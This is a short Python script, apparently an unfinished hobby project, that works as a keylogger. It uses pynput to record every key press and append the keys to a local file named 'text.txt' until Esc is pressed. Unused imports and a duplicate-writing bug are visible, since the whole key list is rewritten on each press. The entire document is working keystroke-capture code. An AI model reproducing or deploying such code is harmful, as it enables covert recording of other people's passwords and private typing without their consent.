from hashlib import new
from  pynput.keyboard  import  Key,Listener
from kivymd.app import MDApp
from kivymd.uix.label import MDLabel

h=[]
# class main_app(MDApp):
def on_press(key):
         h.append(key)
         write_1(h)
         print(key)
def write_1(var):
          with open("text.txt","a") as f:
            for i in var:
               new_var=str(i).replace("'",'')
               f.write(new_var)
    #    f.write(" ")
def on_release(key):
           if key == Key.esc:
                 return  False
with Listener(on_press=on_press, on_release=on_release) as l:
            l.join()
